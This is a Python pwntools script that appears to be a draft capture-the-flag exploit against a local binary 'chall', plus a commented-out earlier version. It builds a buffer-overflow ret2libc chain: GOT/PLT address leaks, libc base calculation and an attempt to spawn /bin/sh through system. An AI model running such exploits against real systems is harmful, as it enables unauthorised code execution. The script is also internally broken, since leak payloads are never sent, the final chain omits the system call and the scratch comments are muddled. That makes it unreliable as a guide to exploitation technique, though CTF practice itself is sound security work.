from pwn import * 

#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    # if args.LOCAL:
    #     r = process([exe.path])
        # if args.GDB:
    # else:
    #     r = remote("addr", 1337)
    r = process(exe.path)
    gdb.attach(r)
    return r


def main():
    io = conn()

    offset = 136
    pop_rdi = next(exe.search(asm('pop rdi ; ret')))

    # Stage 1: Leak the address of 'read'
    payload = flat(
        b'A' * offset,
        pop_rdi,
        exe.got['read'],
        exe.plt['read'],
        exe.sym['main']
    )

    # Read and parse the leaked address
    read_leak = u64(io.recv(8).strip().ljust(8, b'\x00'))
    print(f'Leaked read address: {hex(read_leak)}')

    # read 0x57202c6f6c 6c6548
    # sys  0x57202c6f6c 602ae8
    # libc 0x57202c6f6c 5b1d78
    # write 0       x64 6c726f
    # write 0x646c726f
    # 0x57202c6f6c5b1d78
    payload = flat(
        b'A' * offset,
        pop_rdi,
        exe.got['write'],
        exe.plt['write'],
        exe.sym['main']
    )

    write_leak = u64(io.recv(8).strip().ljust(8, b'\x00'))
    print(f'Leaked write address: {hex(write_leak)}')

    # Calculate the base address of libc
    libc.address = read_leak - libc.symbols['read']
    system = libc.symbols['system']
    binsh = libc.address + 0xebc81 #next(libc.search(b'/bin/sh'))

    temp = write_leak - libc.symbols['write']
    print(f'Libc base read address: {hex(libc.address)}')
    print(f'Libc base write address: {hex(temp)}')
    print(f'System address: {hex(system)}')
    print(f'/bin/sh address: {hex(binsh)}')

    # Stage 2: Call system("/bin/sh")
    payload = flat(
        b'A' * offset,
        pop_rdi,
        binsh,
        0x00
    )

    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()

# file = "./chall"
# libc = "./libc.so.6"
# if (file != ""):
#     elf = context.binary = ELF(file, checksec=False)
# if (libc != ""):
# 		libc = ELF(libc, checksec=False)


# ## exploit

# pop_rdi = next(elf.search(asm('pop rdi ; ret')))

# io = elf.process()

# payload = flat(
#     b'A' * offset,
#     pop_rdi,
#     elf.got['read'],
#     elf.plt['read'],
#     elf.sym['main']
# )

# leak fungsi read 6c6c6548

# io.sendlineafter(b'Hello, World\n', payload)
# puts_leak = u32(io.recv(4))
# print(f'leak: {puts_leak:x}')

# libc.address = puts_leak - libc.sym['read']
# system = libc.sym['system']
# binsh = next(libc.search(b'/bin/sh'))

# payload = flat(
#     b'A' * offset,
#     system,
#     0x0,
#     binsh
# )

# io.sendline(payload)

# io.interactive()